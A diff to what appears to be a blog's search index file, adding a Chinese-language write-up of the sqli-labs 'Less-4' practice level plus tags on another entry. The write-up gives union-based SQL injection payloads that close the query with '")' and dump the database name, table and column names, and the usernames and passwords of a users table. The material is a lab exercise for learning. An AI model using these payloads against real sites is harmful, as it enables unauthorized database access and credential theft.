@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>sql注入练习4</title>
+      <link href="test23/undefined-undefined.html"/>
+      <url>test23/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>这关和前面的没有什么不同的。  </p><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>这次后台的sql语句是这样的  </p><blockquote><p>$sql=”SELECT * FROM users WHERE id=(“$id”) LIMIT 0,1”;</p></blockquote><p>那么结合上一关，我们只要在id=1后面加上”)就可以成功闭合。其余的步骤和之前的就一样了。<br>接下来爆库名  </p><blockquote><p>?id=1”) union select 1,2,database()–+</p></blockquote><p>爆表名</p><blockquote><p>?id=1”) union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),database()–+</p></blockquote><p>爆字段 </p><blockquote><p>select group_ concat(column_name) from information _ schema.columns where table _name=’users’ </p></blockquote><p>爆字段信息  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> test23 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>寒假练习16</title>
       <link href="test22/undefined-undefined.html"/>
       <url>test22/undefined-undefined.html</url>
@@ -17,6 +42,12 @@
           
       </categories>
       
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
       
     </entry>
     
